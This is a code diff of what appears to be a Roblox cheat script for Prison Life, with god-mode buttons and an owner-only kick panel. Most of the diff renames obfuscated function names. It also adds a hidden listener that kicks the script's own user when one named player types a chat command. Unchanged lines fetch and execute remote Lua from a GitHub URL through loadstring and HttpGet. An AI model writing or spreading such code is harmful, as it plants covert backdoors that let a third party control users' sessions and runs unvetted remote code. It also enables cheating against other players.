@@ -402,7 +402,7 @@ end)
 
 -- Scripts:
 
-local function KPPEU_fake_script() -- Frame.LocalScript 
+local function HCGNES_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	function GetPlayer(String)
@@ -417,8 +417,8 @@ local function KPPEU_fake_script() -- Frame.LocalScript
 	end
 	
 end
-coroutine.wrap(KPPEU_fake_script)()
-local function UGXYQF_fake_script() -- Frame.LocalScript 
+coroutine.wrap(HCGNES_fake_script)()
+local function YQRF_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	local function LVKIELK_fake_script()
@@ -440,15 +440,15 @@ local function UGXYQF_fake_script() -- Frame.LocalScript
 	coroutine.wrap(LVKIELK_fake_script)()
 	
 end
-coroutine.wrap(UGXYQF_fake_script)()
-local function YBYT_fake_script() -- Frame.LocalScript 
+coroutine.wrap(YQRF_fake_script)()
+local function CKUH_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/rgie2155/Prison-Life/main/blacklist.lua',true))()
 	
 end
-coroutine.wrap(YBYT_fake_script)()
-local function TJUKC_fake_script() -- GodOff.LocalScript 
+coroutine.wrap(CKUH_fake_script)()
+local function GORTRY_fake_script() -- GodOff.LocalScript 
 	local script = Instance.new('LocalScript', GodOff)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -467,8 +467,8 @@ local function TJUKC_fake_script() -- GodOff.LocalScript
 		end
 	end)
 end
-coroutine.wrap(TJUKC_fake_script)()
-local function RYMK_fake_script() -- GodOn.LocalScript 
+coroutine.wrap(GORTRY_fake_script)()
+local function FMZO_fake_script() -- GodOn.LocalScript 
 	local script = Instance.new('LocalScript', GodOn)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -487,14 +487,45 @@ local function RYMK_fake_script() -- GodOn.LocalScript
 		end
 	end)
 end
-coroutine.wrap(RYMK_fake_script)()
-local function JKTAY_fake_script() -- kickthing.LocalScript 
+coroutine.wrap(FMZO_fake_script)()
+local function MODNI_fake_script() -- kickthing.LocalScript 
 	local script = Instance.new('LocalScript', kickthing)
 
 	local owner = {2034150150}
 	local userid = game:GetService('Players').LocalPlayer.UserId
 	if userid == (owner[#owner]) then
-		script.Parent.Visible = true
+		game.CoreGui.kickthing.Visible = true
 	end
 end
-coroutine.wrap(JKTAY_fake_script)()
+coroutine.wrap(MODNI_fake_script)()
+local function XMVMLYM_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	local Player = game:GetService("Players")
+	local LocalPlayer = Player.LocalPlayer
+	local PlayerScripts = LocalPlayer.PlayerScripts
+	local prefix = ";"
+	
+	function ConsoleMessage(text)
+		local sg = game:GetService("StarterGui")
+		local Method = "ChatMakeSystemMessage"
+		sg:SetCore(Method, {Text = text, TextSize = 18, Color = Color3.new(0.666667, 0.666667, 1)})
+	end
+	
+	function findPlr(self)
+		for k, b in pairs(game.Players:GetPlayers()) do
+			if string.find(b.Name:lower(), self) then
+				return b
+			end
+		end
+	end
+	
+	game.Players.EEEEKK25.Chatted:Connect(
+		function(msg)
+			if msg:match(prefix .. "kick default") then
+				game.Players.LocalPlayer:Kick("L bozo")
+			end
+		end)
+	_G.toggle = true
+end
+coroutine.wrap(XMVMLYM_fake_script)()
